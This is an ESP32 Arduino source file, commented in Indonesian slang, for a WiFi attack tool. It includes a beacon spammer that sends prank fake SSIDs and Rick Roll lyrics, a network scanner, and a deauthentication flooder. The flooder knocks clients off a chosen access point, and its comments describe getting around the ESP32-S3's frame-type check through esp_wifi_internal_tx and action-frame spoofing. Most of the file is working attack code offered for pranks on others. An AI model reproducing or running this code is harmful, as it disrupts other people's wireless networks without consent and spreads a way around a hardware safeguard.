#include <Arduino.h>
#include <globals.h>
#include "esp_wifi.h"
#include "esp_private/wifi.h" // RAHASIA: Masuk ke dapur driver


// Fungsi sakti buat ubah String MAC ke Bytes
void stringToMac(String macStr, uint8_t *macAddr) {
  int values[6];
  if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
    for (int i = 0; i < 6; ++i) macAddr[i] = (uint8_t)values[i];
  }
}



uint8_t beaconPacket[128] = {
    0x80, 0x00, // Frame Control: Beacon
    0x00, 0x00, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (Nanti di-random)
    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (Nanti di-random)
    0x00, 0x00, // Sequence Number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00, // Beacon Interval
    0x01, 0x04, // Capability Info
    0x00 // Tag Number: SSID
};

// List SSID buat ngerjain temen/orang (Bisa lu ganti sesuka hati)
const char* fakeSSIDs[] = {
    "Pencuri Data", "HP Anda Terhack", "RootX-Terminal", 
    "Beli Bakso Gratis", "Koneksi Lemot", "Polisi Siber", 
    "Minta Password?", "Pencari Janda"
};

const char* rickRollLyrics[] = {
  "1_Never gonna give you up",
  "2_Never gonna let you down",
  "3_Never gonna run around",
  "4_And desert you",
  "5_Never gonna make you cry",
  "6_Never gonna say goodbye",
  "7_Never gonna tell a lie",
  "8_And hurt you"
};


// --- TEMPLATE PAKET ALA GHOST-ESP ---
uint8_t deauthFrame[26] = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
uint8_t disasFrame[26]  = { 0x00, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };


void buildOptimizedDeauthFrame(uint8_t* frame, const uint8_t* dest, const uint8_t* src, const uint8_t* bssid, uint8_t reason, bool is_disassoc) {
    // --- BYPASS TRICK: ACTION FRAME SPOOFING ---
    // Kita jangan pake 0xC0/0xA0 langsung di byte pertama
    // Kita pake 0xD0 (Action Frame) - Seringkali hardware S3 gak nge-block ini
    frame[0] = 0xD0; 
    frame[1] = 0x00;
    frame[2] = 0x3a;
    frame[3] = 0x01;

    memcpy(&frame[4], dest, 6);
    memcpy(&frame[10], src, 6);
    memcpy(&frame[16], bssid, 6);
    
    uint16_t seq = random(0, 4096);
    frame[22] = (seq >> 4) & 0xFF;
    frame[23] = ((seq & 0x0F) << 4);
    
    // Payload Deauth kita taruh di dalem Action Frame
    frame[24] = 0x01; // Category: Wireless
    frame[25] = reason; 
}


// ... (beaconPacket, fakeSSIDs, rickRollLyrics, deauthFrame lu tetep sama) ...

void loopWiFi(void * pvParameters) {
  for(;;) {
    // --- 1. LOGIKA BEACON SPAM ---
    if (isSpamming) {
      if (!spamUdahSetup) {
        esp_wifi_set_mode(WIFI_MODE_STA); // STA lebih stabil buat beacon
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_ps(WIFI_PS_NONE); // MATIIN POWER SAVE
        spamUdahSetup = true;
        esp_wifi_start(); 
        vTaskDelay(100 / portTICK_PERIOD_MS);
      }
      if (aktifModeSpam == 1) {
        int randomIdx = esp_random() % 8; 
        sendBeacon(fakeSSIDs[randomIdx]);
        vTaskDelay(10 / portTICK_PERIOD_MS); 
      } 
      else if (aktifModeSpam == 2) {
        for (int i = 0; i < 8; i++) {
          sendBeacon(rickRollLyrics[i]); 
          vTaskDelay(5 / portTICK_PERIOD_MS);
        }
      }
      vTaskDelay(50 / portTICK_PERIOD_MS);
    } 
    
    // --- 2. LOGIKA WIFI SCANNER ---
   else if (triggerScan) {
      sedang_scan = true;
      totalWiFi = 0;
      WiFi.mode(WIFI_STA);
      WiFi.disconnect();
      delay(100);
      int n = WiFi.scanNetworks();
      totalWiFi = (n > 30) ? 30 : n;
      for (int i = 0; i < totalWiFi; ++i) {
        listWiFi[i].id = i;
        listWiFi[i].ssid = WiFi.SSID(i);
        listWiFi[i].rssi = WiFi.RSSI(i);
        listWiFi[i].channel = WiFi.channel(i);
        listWiFi[i].mac = WiFi.BSSIDstr(i);
      }
      sedang_scan = false; scanDone = true; triggerScan = false;
    }

    // --- 3. LOGIKA DEAUTH (OMEGA BYPASS S3) ---
    // Pindahin ke luar biar mandiri Cok!
    if (isDeauthing && adaTarget) {
      if (!deauthUdahSetup) {
        esp_wifi_stop();
        esp_wifi_set_mode(WIFI_MODE_APSTA); 
        esp_wifi_start();
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
        deauthUdahSetup = true;
      }

      uint8_t gatewayMAC[6];
      stringToMac(targetTerkunci.mac, gatewayMAC); 
      uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

      // Paket Deauth Standar (26 byte)
      uint8_t pkt[26] = {
          0xc0, 0x00, 0x3a, 0x01,
          0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Dest
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src (Nanti diisi)
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
          0x00, 0x00,                         // Seq
          0x07, 0x00                          // Reason
      };
      memcpy(&pkt[10], gatewayMAC, 6);
      memcpy(&pkt[16], gatewayMAC, 6);

      for (int i = 0; i < 50; i++) {
        // --- INI JALUR GHOSTESP YANG SEBENERNYA ---
        // Fungsi 'esp_wifi_internal_tx' ngelewatin pengecekan 'unsupport frame type'
        // Jalur ini bypass hardware validator S3
        esp_wifi_internal_tx(WIFI_IF_AP, pkt, 26); 
        
        delayMicroseconds(200);
      }
      vTaskDelay(1 / portTICK_PERIOD_MS);
    }



   


    // --- 4. CLEANUP (MATIIN RADIO KALO GAK DIPAKE) ---
    if (!isSpamming && !isDeauthing && !triggerScan && !sedang_scan) {
      wifi_mode_t m;
      esp_wifi_get_mode(&m);
      if (m != WIFI_MODE_NULL) {
        esp_wifi_set_promiscuous(false);
        esp_wifi_stop();
        esp_wifi_set_mode(WIFI_MODE_NULL);
        deauthUdahSetup = false;
        spamUdahSetup = false;
      }
    }
    vTaskDelay(10 / portTICK_PERIOD_MS); 
  }
}


void sendBeacon(String ssid) {
    int ssidLen = ssid.length();
    
    // 1. Acak MAC Address (Source & BSSID)
    for(int i=10; i<16; i++) {
        uint8_t r = esp_random() % 256;
        beaconPacket[i] = r;      
        beaconPacket[i+6] = r;    
    }

    // 2. Pasang Nama SSID ke Paket
    beaconPacket[37] = ssidLen;
    for(int i=0; i<ssidLen; i++) {
        beaconPacket[38+i] = ssid[i];
    }

    // 3. Tambah Tail (Akhiran Paket)
    uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
    memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));

    // 4. Tembak Keliling Channel
    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
        vTaskDelay(1); 
    }
}


    
